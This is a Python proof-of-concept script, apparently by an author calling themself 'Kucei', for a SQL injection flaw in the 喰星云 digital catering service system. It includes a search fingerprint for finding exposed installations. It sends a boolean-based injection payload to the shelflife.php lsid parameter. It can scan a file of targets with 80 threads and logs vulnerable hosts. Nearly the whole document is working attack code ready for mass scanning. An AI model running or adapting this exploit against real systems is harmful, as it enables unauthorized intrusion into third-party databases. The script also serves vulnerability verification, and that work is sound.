# 喰星云·数字化餐饮服务系统 多处 SQL注入漏洞[2]
# body="tmp_md5_pwd"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def denner():
    test = """    
███████╗██╗  ██╗██╗   ██╗     ███████╗ ██████╗ ██╗     
██╔════╝╚██╗██╔╝╚██╗ ██╔╝     ██╔════╝██╔═══██╗██║     
███████╗ ╚███╔╝  ╚████╔╝█████╗███████╗██║   ██║██║     
╚════██║ ██╔██╗   ╚██╔╝ ╚════╝╚════██║██║▄▄ ██║██║     
███████║██╔╝ ██╗   ██║        ███████║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═╝   ╚═╝        ╚══════╝ ╚══▀▀═╝ ╚══════╝                                    
                            --author:Kucei
                            --Version:喰星云·数字化餐饮服务系统 多处 SQL注入漏洞 [2]                        
"""
    print(test)

def main():
    denner()
    parser = argparse.ArgumentParser(description="喰星云·数字化餐饮服务系统 多处 SQL注入漏洞 [2]")
    parser.add_argument('-u','--url',dest='url',type=str,help="Please Input URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="Please Input File")
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/logistics/home_warning/php/shelflife.php?do=getList&lsid=%28SELECT+%28CASE+WHEN+%289764%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'Priority':'u=0, i',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
    }

    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.text)
        if response.status_code == 200 and 'success' in response.text:
            print( f"[+] {target} 存在漏洞！\n[+] ")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload)
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()
